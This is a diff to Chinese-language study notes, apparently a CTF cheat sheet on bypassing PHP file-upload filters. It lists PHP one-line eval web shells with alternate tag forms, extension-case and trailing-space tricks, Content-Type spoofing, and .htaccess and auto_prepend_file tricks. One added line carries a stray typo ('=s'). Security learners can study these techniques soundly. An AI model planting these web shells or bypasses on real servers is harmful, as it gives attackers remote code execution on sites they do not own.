@@ -222,13 +222,35 @@ text=data://text/plain;base64，base64后的字符串
 
 ### 文件上传
 
+参考https://blog.csdn.net/admin18310911366/article/details/107998925#t9
+
+更详细点
+
 ##### 一句话
 
 ```
 <?php @eval($_POST['ac']); ?>
 ```
 
-##### 图片绕过
+
+
+##### 标签绕过
+
+```
+php标签被绕过
+还有以下几种写法
+<?php ?>
+<??>
+<%%>
+<script language="php"></script>
+
+
+
+<% @eval($_POST['cmd']); %>
+<? @eval($_POST['cmd']); ?>
+```
+
+##### Content-Type绕过
 
 1.
 
@@ -239,17 +261,30 @@ GIF98a
 
 2.改Content-Type
 
-
-
 ##### 后缀绕过
 
 ```
 php php5 php7 phtml
+
+或者大小写
+.PHP  .pHtml
+```
+
+```
+1.PHP
+```
+
+##### 空格绕过
+
+```
+在php后面添加空格
 ```
 
 ##### .htaccess
 
 https://blog.csdn.net/solitudi/article/details/116666720
+
+
 
 ```
 SetHandler application/x-httpd-php
@@ -270,7 +305,7 @@ https://blog.csdn.net/cosmoslin/article/details/120793126
 
 ```
 auto_prepend_file = <filename>         //包含在文件头
-auto_append_file = <filename>          //包含在文件尾
+auto_append_file =s <filename>          //包含在文件尾
 ```
 
 
